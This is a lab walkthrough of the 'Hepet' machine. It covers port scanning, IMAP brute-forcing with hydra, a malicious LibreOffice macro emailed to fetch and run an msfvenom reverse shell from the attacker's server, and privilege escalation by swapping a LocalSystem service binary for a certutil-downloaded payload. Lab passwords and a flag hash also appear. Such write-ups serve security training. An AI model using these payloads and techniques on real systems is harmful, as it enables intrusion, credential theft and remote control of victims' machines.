																			                        Hepet Walkthrough
																			
																								
Attacker's Machine: 192.168.45.206
Victim's Machine: 192.168.184.140
export IP=192.168.184.140

nmapAutomator.sh -H $IP -t Full

PORT      STATE SERVICE        VERSION
25/tcp    open  smtp           Mercury/32 smtpd (Mail server account Maiser)
|_smtp-commands: localhost Hello nmap.scanme.org; ESMTPs are:, TIME
79/tcp    open  finger         Mercury/32 fingerd
| finger: Login: Admin         Name: Mail System Administrator\x0D
| \x0D
|_[No profile information]\x0D
105/tcp   open  ph-addressbook Mercury/32 PH addressbook server
106/tcp   open  pop3pw         Mercury/32 poppass service
110/tcp   open  pop3           Mercury/32 pop3d
|_pop3-capabilities: USER TOP UIDL APOP EXPIRE(NEVER)
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
143/tcp   open  imap           Mercury/32 imapd 4.62
|_imap-capabilities: IMAP4rev1 X-MERCURY-1A0001 CAPABILITY complete AUTH=PLAIN OK
443/tcp   open  ssl/http       Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
445/tcp   open  microsoft-ds?
2224/tcp  open  http           Mercury/32 httpd
|_http-title: Mercury HTTP Services
5040/tcp  open  unknown
8000/tcp  open  http           Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
|_http-open-proxy: Proxy might be redirecting requests
11100/tcp open  vnc            VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
20001/tcp open  ftp            FileZilla ftpd 0.9.41 beta
|_ftp-bounce: bounce working!
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r-- 1 ftp ftp            312 Oct 20  2020 .babelrc
| -r--r--r-- 1 ftp ftp            147 Oct 20  2020 .editorconfig
| -r--r--r-- 1 ftp ftp             23 Oct 20  2020 .eslintignore
| -r--r--r-- 1 ftp ftp            779 Oct 20  2020 .eslintrc.js
| -r--r--r-- 1 ftp ftp            167 Oct 20  2020 .gitignore
| -r--r--r-- 1 ftp ftp            228 Oct 20  2020 .postcssrc.js
| -r--r--r-- 1 ftp ftp            346 Oct 20  2020 .tern-project
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 build
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 config
| -r--r--r-- 1 ftp ftp           1376 Oct 20  2020 index.html
| -r--r--r-- 1 ftp ftp         425010 Oct 20  2020 package-lock.json
| -r--r--r-- 1 ftp ftp           2454 Oct 20  2020 package.json
| -r--r--r-- 1 ftp ftp           1100 Oct 20  2020 README.md
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 src
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 static
|_-r--r--r-- 1 ftp ftp            127 Oct 20  2020 _redirects
33006/tcp open  unknown
| fingerprint-strings: 
|   NULL: 
|_    Host '192.168.45.239' is not allowed to connect to this MariaDB server
49664/tcp open  msrpc          Microsoft Windows RPC
49665/tcp open  msrpc          Microsoft Windows RPC
49666/tcp open  msrpc          Microsoft Windows RPC
49667/tcp open  msrpc          Microsoft Windows RPC
49668/tcp open  msrpc          Microsoft Windows RPC
49669/tcp open  msrpc          Microsoft Windows RPC
Service Info: Host: localhost; OS: Windows;

# The is a buffer overflow exploit for Mercury/32 SMTP available online

Enumeration
139, 445 - SMB                   # Nothing found

2224                                    # Mailing list subscription management services

8000                                     # web app

# We can see on the main page on the web app that there are multiple members of the team. Let's get their usernames and check maybe we can use any information from their description that might lead to a password.



# We can see that pretty much everybody has their positioning title in their description, however the user Jonas seems to have a weird term.
   Let's grab all the usernames and let's use hydra to brute-force the IMAP Service.
   
     users.txt
   
   
   pass.txt
   
   SicMundusCreatusEst
   
# Before we do any brute-forcing, let's use cewl to generate a password list from the web app and then we can use it to brute-force IMAP.

cewl http://$IP:8000 -m 4 -w cewl.txt


# Let's try to brute force IMAP to see if we get lucky.

hydra -L users.txt -P pass.txt $IP imap -s 143 -e nsr -I



hydra -L users.txt -P cewl.txt $IP imap -s 143 -e nsr -I



# Now that we've got a set of working credentials, let's access IMAP, maybe we find something interesting.

nc 192.168.242.140 143

 or you can use telnet
 
telnet 192.168.242.140 143

# Login on the IMAP Service

tag LOGIN jonas@localhost SicMundusCreatusEst

tag -- This tag is meant to uniquely identify the specific command you're sending. This is mandatory otherwise, it there's latency or network issue and you send multiple commands, when the server responds, the answer might not be in order. So for you so solve this issue you need tags.

localhost -- When you use "localhost" in the username, you are instructing the IMAP client to connect to an IMAP server running on the same machine where the client is running. 

# Let's list the Folders/Mailboxes

A1 LIST "" *



# So we basically have a single mailbox called INBOX. Let's try to access it's contents.

A1 SELECT INBOX

A1 FETCH 1 BODY[]
A1 FETCH 2 BODY[]

From: "mailadmin@localhost" <mailadmin@localhost>

Team,

We will be changing our office suite to LibreOffice. For the moment, all the spreadsheets and documents will be first procesed in the mail server directly to check the compatibility. 

I will forward all the documents after checking everything is working okay. 

Sorry for the inconveniences.

# We discover that the mailadmin@localhost address is processing spreadsheets. We also discover that the office suite used is LibreOffice. This likely means that it will accept .ods or .xls files, which might be a good opportunity for a macro attack.
  I've tried to manual way to generate my own macro and make the server to download and execute shell.exe but i got no results. Don't know why yet.
  However, we can use a script that generates automatically these types of macros that give you shell on the target system if the file is executed by somebody.

# Download script: https://github.com/k1revam/OSCP-Scripts/tree/main/Macro%20Generator%20OfficeLibre  
                             https://github.com/jotyGill/macro-generator
                             
# Generate payload

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.170 LPORT=443 -f exe -o shell.exe      

# Start a python server 
python3 macro-generator.py --host 192.168.45.170 --port 443 -r ':80/shell.exe'
python3 -m http.server 80

# Generate the macro

python3 macro-generator.py --host 192.168.45.170 --port 443 -r ':80/shell.exe'

# Take the payload and place it in basic macro in LibreOffice Calc since .ods files are generated by LibreOffice Calc.
   Once you've create a new macro, don't forget to set the macro to run automatically when the file is opened.
   
   Tools --> Customize ..
   
   
   
# Now that we have our file, let's save it as mymacro.ods

# We have everything ready, let's send an email to the admin account which contains out file. We will use sendmail.

sendemail -f 'jonas@localhost' -t 'mailadmin@localhost' -s 192.168.184.140:25 -u 'Hi' -m 'Bye' -a mymacro.ods

rlwrap nc -lvnp 443


whoami
hepet\ela arwel

# Ok, we've in, grab the frag and go for privesc.

Privilege Escalation

wmic service get  name, startname,pathname

VeyonService                              C:\Users\Ela Arwel\Veyon\veyon-service.exe                                               LocalSystem

# Search for autologon credentials

reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

    DefaultPassword    REG_SZ    LadderWheelGallon443
    DefaultUserName    REG_SZ    Ela Arwel

# Let's use winpeas for some quick results

C:\Users\Administrator : Ela Arwel [AllAccess]

C:\Users\Ela Arwel\Veyon\veyon-worker.exe] -- POwn: Ela Arwel
[C:\Users\Ela Arwel\Veyon\veyon-service.exe] - Auto - Running - No quotes and Space detected
    Possible DLL Hijacking in binary folder: C:\Users\Ela Arwel\Veyon (Ela Arwel [AllAccess])

# If we have full control over the binary and it's autorunning, let's replace the binary with our own reverse shell and wait for the program to run.                      

icacls "C:\Users\Ela Arwel\Veyon\veyon-worker.exe"

C:\Users\Ela Arwel\Veyon\veyon-worker.exe NT AUTHORITY\SYSTEM:(I)(F)
                                          BUILTIN\Administrators:(I)(F)
                                          HEPET\Ela Arwel:(I)(F)
                                          
cd “C:\Users\Ela Arwel\Veyon”

# Let's check which service name is associated with veyon-worker.exe 

wmic service get  name, startname,pathname

# The list is huge, let's search by it's name

wmic service get  name, startname,pathname | find "veyon-worker.exe"
VeyonService                              C:\Users\Ela Arwel\Veyon\veyon-service.exe                                               LocalSystem

sc qc VeyonService  
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: VeyonService
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Users\Ela Arwel\Veyon\veyon-service.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Veyon Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
        
# Ok, let's move the veyon-service.exe binary in order for us to replace it, because we don't have rights to stop the serivice manually or delete it

move veyon-service.exe  veyon-service.exe.bak

# Now let's create a reverse shell with the name veyon-service.exe. use an existing port because aparently if you use another unkown port, you won't get the shell.

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.170 LPORT=443 -f exe -o veyon-service.exe

# Now copy the reverse shell in the folder replacing the older executable

certutil -f -urlcache http://192.168.45.170/veyon-service.exe veyon-service.exe

# Restart the system in order for the executable to start, because it's set to auto-run. Have a listener ready on port 443.

shutdown /r /t 0



cd C:\Users\Administrator\Desktop
more proof.txt
373d14ec5749f77f143f1b081296ace5
